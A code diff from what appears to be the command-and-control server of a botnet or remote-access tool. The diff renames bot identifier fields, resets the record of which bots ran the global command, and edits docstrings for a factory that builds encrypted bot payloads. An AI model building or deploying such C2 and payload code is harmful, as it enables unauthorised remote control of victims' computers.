@@ -90,7 +90,7 @@ class Model:
         self._cursor.execute("CREATE TABLE global_command("
                              "command text)")
         self._cursor.execute("CREATE TABLE global_executed("
-                             "uid text)")
+                             "bot_uid text)")
         self._cursor.execute("CREATE TABLE upload_files("
                              "url_path text, "
                              "local_path text)")
@@ -156,6 +156,7 @@ class Model:
         """Sets the global command."""
         with self._lock:
             self._cursor.execute("DELETE FROM global_command")
+            self._cursor.execute("DELETE FROM global_executed")
             self._cursor.execute("INSERT INTO global_command VALUES(?)", (str(command),))
             self._database.commit()
 
@@ -169,13 +170,13 @@ class Model:
             else:
                 return response[0]
 
-    def add_executed_global(self, uid: str):
+    def add_executed_global(self, bot_uid: str):
         """Adds the bot the list of who has executed the global module."""
         with self._lock:
-            self._cursor.execute("INSERT INTO global_executed VALUES (?)", (uid,))
+            self._cursor.execute("INSERT INTO global_executed VALUES (?)", (bot_uid,))
             self._database.commit()
 
-    def has_executed_global(self, uid: str) -> Tuple[bool, Optional[str]]:
+    def has_executed_global(self, bot_uid: str) -> Tuple[bool, Optional[str]]:
         """:return: True if the bot has executed the global command or if no global command has been set."""
         with self._lock:
             global_command = self.get_global_command()
@@ -183,8 +184,8 @@ class Model:
             if not global_command:
                 return True, None
             else:
-                response = self._cursor.execute("SELECT * FROM global_executed WHERE uid = ? LIMIT 1",
-                                                (uid,)).fetchone()
+                response = self._cursor.execute("SELECT * FROM global_executed WHERE bot_uid = ? LIMIT 1",
+                                                (bot_uid,)).fetchone()
 
                 if response:
                     return True, None
@@ -219,7 +220,7 @@ class Model:
     def add_upload_file(self, url_path: str, local_path: str):
         """Adds a file which should be hosted by the server.
 
-        Automatically removed by the server once the bot downloads this file.
+        Should be automatically removed by the caller in x seconds.
         """
         with self._lock:
             self._cursor.execute("INSERT INTO upload_files VALUES (?,?)", (url_path, local_path))
@@ -248,7 +249,7 @@ class PayloadFactory:
 
     @staticmethod
     def create_payload(bot_uid: str, payload_options: dict, loader_options: dict) -> str:
-        """:return: The encrypted payload wrapped in the specified loader."""
+        """:return: The configured and encrypted payload."""
         # Configure bot.py
         with open(path.realpath(path.join(path.dirname(__file__), path.pardir, "bot", "bot.py"))) as input_file:
             configured_payload = ""
